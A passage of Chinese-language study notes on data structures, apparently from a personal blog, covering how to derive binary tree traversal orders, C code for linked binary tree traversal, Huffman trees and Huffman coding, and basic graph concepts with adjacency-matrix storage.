class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">先序：ABCDEFGH，中序：BDCEAFHG，求后序？</span><br><span class="line">分析：按照先序的定义，A为最外层根节点，按照中序的定义和前面的结论可知BDCE为A节点的左子树节点，FHG为A节点的右子树，再依次按照两个遍历定义可以推出原始二叉树为：        </span><br><span class="line"> A       </span><br><span class="line">    / \ </span><br><span class="line">          B   F</span><br><span class="line">               \    \</span><br><span class="line">             C    G</span><br><span class="line">              / \  /  </span><br><span class="line">             D  E  H</span><br><span class="line">那么此二叉树的后序为：DECBHGFA</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">先序：ABDGHCEFI，中序：GDHBAECIF，求后序？</span><br><span class="line">分析：按照先序的定义得到A为最外层根节点，再根据中序结果可知GDHB为A的左子树，ECIF为A的右子树；B先出现在先序结果中可知B为左子树的根节点，再根据中序结果知B节点没有右子树，GDH均为B节点的左子树，再根据先序结果D先出现，知D为B左子树的根节点，再根据先序发现G在D的后面且中序中G在D的前面得出G为D左子树的根节点，那么D的右子树的根节点就是H了，依次类推A的右子树，得出原始二叉树为：      </span><br><span class="line"> A</span><br><span class="line">/ \</span><br><span class="line">B   C</span><br><span class="line">      /   / \</span><br><span class="line">    D   E   F</span><br><span class="line">  / \     /</span><br><span class="line">G   H   I</span><br><span class="line">那么此二叉树的后序为：GHDBEIFCA</span><br></pre></td></tr></table></figure><p>例子3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">中序：BDCEAFHG，后序：DECBHGFA，求先序？</span><br><span class="line">分析：由后序结果知A为最外层根节点，再根据中序结果知BDCE为A节点的左子树，FHG为A的右子树；A的左子树中B最靠近A那么根据后序规则得出B为左子树的根节点，再根据中序结果B在结果的第一位，由中序规则知B没有左子树，DCE均为B的右子树，在DCE中后序结果C最靠近B，得出C为B的右子树的根节点，再依据中序结果知C前面是D后面是E得出D为C的左子树，E为C的右子树，同理可以推出A的右子树，得出原始二叉树为：        </span><br><span class="line">     A       </span><br><span class="line">/ \</span><br><span class="line">               B   F</span><br><span class="line">                \   \</span><br><span class="line">              C   G</span><br><span class="line">                / \  /</span><br><span class="line">               D   E H</span><br><span class="line">那么此二叉树的先序为：ABCDEFGH</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><strong>树的应用</strong></p><ul><li>树是数据库中数据组织的一种重要形式</li><li>操作系统子父进程的关系本身就是一棵树</li><li>面向对象语言中类的继承关系本身就是一棵树</li><li>赫夫曼树</li></ul><h3 id="3-1-1-链式二叉树的遍历"><a href="#3-1-1-链式二叉树的遍历" class="headerlink" title="3.1.1 链式二叉树的遍历"></a>3.1.1 链式二叉树的遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pLchild</span>;</span> <span class="comment">//p是指针 L是左 child是孩子</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pRchild</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PostTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="keyword">struct</span> BTNode * <span class="title function_">CreateBTree</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pT</span> =</span> CreateBTree();</span><br><span class="line"></span><br><span class="line">    PreTraverseBTree(pT); <span class="comment">//先序</span></span><br><span class="line">    InTraverseBTree(pT); <span class="comment">//中序</span></span><br><span class="line">    PostTraverseBTree(pT); <span class="comment">//后序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, pT-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        {</span><br><span class="line">            PreTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        {</span><br><span class="line">            PreTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问根节点</span></span><br><span class="line"><span class="comment">    再先序访问左子树</span></span><br><span class="line"><span class="comment">    再先序访问右子树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        {</span><br><span class="line">            InTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, pT-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        {</span><br><span class="line">            InTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问左子树</span></span><br><span class="line"><span class="comment">    再访问根</span></span><br><span class="line"><span class="comment">    再访问右子树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        {</span><br><span class="line">            PostTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        {</span><br><span class="line">            PostTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, pT-&gt;data);</span><br><span class="line">    }</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问左子树</span></span><br><span class="line"><span class="comment">    再访问右子树</span></span><br><span class="line"><span class="comment">    再访问根</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BTNode * <span class="title function_">CreateBTree</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pA</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pB</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pC</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pD</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pE</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line"></span><br><span class="line">    pA-&gt;data = <span class="string">'A'</span>;</span><br><span class="line">    pB-&gt;data = <span class="string">'B'</span>;</span><br><span class="line">    pC-&gt;data = <span class="string">'C'</span>;</span><br><span class="line">    pD-&gt;data = <span class="string">'D'</span>;</span><br><span class="line">    pE-&gt;data = <span class="string">'E'</span>;</span><br><span class="line"></span><br><span class="line">    pA-&gt;pLchild = pB;</span><br><span class="line">    pA-&gt;pRchild = pC;</span><br><span class="line">    pB-&gt;pLchild = pB-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line">    pC-&gt;pLchild = pD;</span><br><span class="line">    pC-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line">    pD-&gt;pLchild = <span class="literal">NULL</span>;</span><br><span class="line">    pD-&gt;pRchild = pE;</span><br><span class="line">    pE-&gt;pLchild = pE-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pA;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="3-1-2-哈夫曼树-最优二叉树"><a href="#3-1-2-哈夫曼树-最优二叉树" class="headerlink" title="3.1.2 哈夫曼树(最优二叉树)"></a>3.1.2 哈夫曼树(最优二叉树)</h3><p>结点数目相同的二叉树中，完全二叉树是路径长度最短的二叉树。</p><p>权(weight)：将树中结点赋给一个有着某种含义的数值，则这个数值称为该结点的权。</p><p>结点的带权路径长度：从根结点到该结点之间的路径长度与该结点的权的乘积。</p><p>树的路径长度：从树根到每一个结点的路径长度之和，记作TL。</p><p>树的带权路径长度：树中所有叶子结点的带权路径长度之和，记作WPL。</p><p>哈夫曼树就是带权路径长度(WPL)最短的二叉树(最优二叉树)。</p><p>在哈夫曼算法中，初始时有n棵二叉树，要经过n-1次合并最终形成哈夫曼树。经过n-1次合并产生n-1个新结点，且这n-1个新结点都是具有两个孩子的分支结点。可见，哈夫曼树中共有n+n-1=2n-1个结点，且其所有的分支结点的度均不为1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">    <span class="type">int</span> parent, lch, rch;</span><br><span class="line">}HTNode, *HuffmanTree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateHuffmanTree</span><span class="params">(HuffmanTree HT, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    m = <span class="number">2</span> * n - <span class="number">1</span>;<span class="comment">//数组共2n-1个元素</span></span><br><span class="line">    HT = <span class="keyword">new</span> HTNode[m+<span class="number">1</span>];<span class="comment">//0号单元未用，HT[m]表明根结点</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">    {<span class="comment">//初始化哈夫曼树</span></span><br><span class="line">        HT[i].lch = <span class="number">0</span>;</span><br><span class="line">        HT[i].rch = <span class="number">0</span>;</span><br><span class="line">        HT[i].parent = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">        cin &gt;&gt; HT[i].weight;<span class="comment">//输入前n个元素的权值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//建立哈夫曼树</span></span><br><span class="line">    <span class="keyword">for</span>(i=n+<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">Select</span>(HT, i<span class="number">-1</span>, s1, s2);<span class="comment">//合并产生n-1个结点，在HT[k](1&lt;=k&lt;=i-1)中选择两个其双亲域为0，且权值最小的结点，并返回它们在HT中的序号s1和s2</span></span><br><span class="line">        HT[s1].parent = i;</span><br><span class="line">        HT[s2].parent = i;</span><br><span class="line">        HT[i].weight = HT[s1].weight + HT[s2].weight;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="3-1-3-哈夫曼树的应用——哈夫曼编码"><a href="#3-1-3-哈夫曼树的应用——哈夫曼编码" class="headerlink" title="3.1.3 哈夫曼树的应用——哈夫曼编码"></a>3.1.3 哈夫曼树的应用——哈夫曼编码</h3><p>将编码设计为长度不等的二进制编码，即让待传字符串中出现次数较多的字符采用尽可能短的编码，则转换的二进制字符串便可能减少。</p><p>关键：设计长度不等的编码，则必须使任一字符的编码都不是另一个字符的编码的前缀，这种编码称作前缀编码。</p><p>方法：</p><ol><li><p>统计字符集中每个字符在电文中出现的平均概率(概率越大，要求编码越短)</p></li><li><p>利用哈夫曼树的特点：权越大的叶子离根越近，将每个字符的概率值作为权值，构造哈夫曼树。概率越大的结点，路径越短。</p></li><li><p>在哈夫曼树的每个分支上标上0或1：</p><p>结点的左分支标0，右分支标1</p><p>把从根到每个叶子的路径上的标号连接起来，作为该叶子代表的字符的编码</p></li></ol><p>思考：</p><ol><li><p>为什么哈夫曼编码能够保证是前缀编码？</p><p>因为没有一片树叶是另一片树叶的祖先，所以每个叶结点的编码就不可能是其它叶结点编码的前缀。</p></li><li><p>为什么哈夫曼编码能够保证字符编码总长最短？</p><p>因为哈夫曼树的带权路径长度最短，故字符编码的总长最短。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateHuffmanCode</span><span class="params">(HuffmanTree HT, HuffmanCode &amp;HC, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//从叶子到根逆向求每个字符的哈夫曼编码，存储在编码表HC中</span></span><br><span class="line">    HC = <span class="keyword">new</span> <span class="type">char</span> *[n+<span class="number">1</span>];<span class="comment">//分配n个字符编码的头指针矢量</span></span><br><span class="line">    cd = <span class="keyword">new</span> <span class="type">char</span> [n];<span class="comment">//分配临时存放编码的动态数组空间</span></span><br><span class="line">    cd[n<span class="number">-1</span>] = <span class="string">'\0'</span>;<span class="comment">//编码结束符</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)<span class="comment">//逐个字符求哈夫曼编码</span></span><br><span class="line">    {</span><br><span class="line">        start = n - <span class="number">1</span>;</span><br><span class="line">        c = i;</span><br><span class="line">        f = HT[i].parent;</span><br><span class="line">        <span class="keyword">while</span>(f != <span class="number">0</span>)<span class="comment">//从叶子结点开始向上回溯，直到根结点</span></span><br><span class="line">        {</span><br><span class="line">            --start;<span class="comment">//回溯一次start向前指一个位置</span></span><br><span class="line">            <span class="keyword">if</span>(HT[f].lch == c)</span><br><span class="line">                cd[start] = <span class="string">'0'</span>;<span class="comment">//结点c是f的左孩子，置0</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cd[start] = <span class="string">'1'</span>;<span class="comment">//右孩子置1</span></span><br><span class="line">            c = f;<span class="comment">//继续向上回溯</span></span><br><span class="line">            f = HT[f].parent;<span class="comment">//求出第i个字符的编码</span></span><br><span class="line">        }</span><br><span class="line">        HC[i] = <span class="keyword">new</span> <span class="type">char</span> [n-start];</span><br><span class="line">        <span class="built_in">strcpy</span>(HC[i], &amp;cd[start]);<span class="comment">//将求得的编码从临时空间cd复制到HC的当前行中</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">delete</span> cd;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="3-2-图"><a href="#3-2-图" class="headerlink" title="3.2 图"></a>3.2 图</h2><p>离散数学的知识，我恨！我不想再记多一门课的笔记了呜呜呜。</p><h3 id="3-2-1-图的概念"><a href="#3-2-1-图的概念" class="headerlink" title="3.2.1 图的概念"></a>3.2.1 图的概念</h3><p>图：G = (V, E)，V是顶点(数据元素)的有穷非空集合，E是边的有穷集合。</p><p>无向图：每条边都是无方向的。</p><p>有向图：每条边都是有方向的。</p><p>完全图：任意两个点都有一条边相连。</p><p>顶点的度：与该顶点相关联的边的数目，记为TD(v)</p><p>在有向图中，顶点的度等于该顶点的入度与出度之和。顶点v的入度是以v为终点的有向边的条数，记作ID(v)；顶点v的出度是以v为始点的有向边的条数，记作OD(v)。</p><p>路径：接续的边构成的顶点序列。</p><p>路径长度：路径上边或弧的数目/权值之和。</p><p>回路(环)：第一个顶点和最后一个顶点相同的路径。</p><p>简单路径：除路径起点和终点可以相同外，其余顶点均不相同的路径。</p><p>简单回路(简单环)：除路径起点和终点相同外，其余顶点均不相同的路径。</p><p>连通图(强连通图)：在无(有)向图G=(V,{E})中，若对任何两个顶点v、u都存在从v到u的路径，则称G是连通图(强连通图)。</p><p>权：图中边或弧所具有的相关数称为权。表明从一个顶点到另一个顶点的距离或耗费。</p><p>网：带权的图。</p><h3 id="3-2-2-图的存储结构"><a href="#3-2-2-图的存储结构" class="headerlink" title="3.2.2 图的存储结构"></a>3.2.2 图的存储结构</h3><p>图的逻辑结构：多对多。</p><p>图没有顺序存储结构，但可以借助二维数组来表示元素间的关系。数组表示法：邻接矩阵。</p><p>多重链表：邻接表、邻接多重表、十字链表。</p><h4 id="3-2-2-1-邻接矩阵"><a href="#3-2-2-1-邻接矩阵" class="headerlink" title="3.2.2.1 邻接矩阵"></a>3.2.2.1 邻接矩阵</h4><p>建立一个顶点表(记录各个顶点信息)和一个邻接矩阵(表示各个顶点之间关系)。设图A=(V,E)有n个顶点，则</p><div class="table-container"><table><thead><tr><th>i</th><th>0</th><th>1</th><th>2</th><th>…</th><th>n-1</th></tr></thead><tbody><tr><td>Vexs[i]</td><td>V1</td><td>V2</td><td>V3</td><td>…</td><td>Vn</td></tr></tbody></table></div><p>图的邻接矩阵是一个二维数组A.arcs[n][n]，定义为：</p><script type="math/tex; mode=display">A.arcs[i][j]=\begin{cases}1，如果<i,j>\in E或者(i,j)\in E\\\\0，否则\end{cases}</script><p>无向图的邻接矩阵是对称的。顶点i的度=第i行(列)中1的个数。完全图的邻接矩阵中，对角元素为0，其余为1。</p><p>在有向图的邻接矩阵中，第i行表示以结点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.059ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 910 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>为尾的弧(即出度边)，第i列表示以结点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.059ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 910 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>为头的弧(即入度边)。</p><p>有向图的邻接矩阵可能是不对称的。顶点的出度=第i行元素之和，顶点的入度=第i列元素之和，顶点的度=第i行元素之和+第i列元素之和。</p><p>网(即有权图)的邻接矩阵表示法：</p><script type="math/tex; mode=display">A.arcs[i][j]=\begin{cases}W_{ij}，<v_i,v_j>或(v_i,v_j)\in VR\\\\\infty，无边(弧)\end{cases}</script><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接矩阵的存储表示：用两个数组分别存储顶点表和邻接矩阵</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxInt 32767<span class="comment">//表示无穷</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MVNum 100<span class="comment">//定义最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> VerTexType;<span class="comment">//设顶点的数据类型为字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ArcType;<span class="comment">//边的权值</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    VerTexType vexs[MVNum];<span class="comment">//顶点表</span></span><br><span class="line">    ArcType arcs[MVNum][MVNum];<span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;<span class="comment">//图的当前点和边数</span></span><br><span 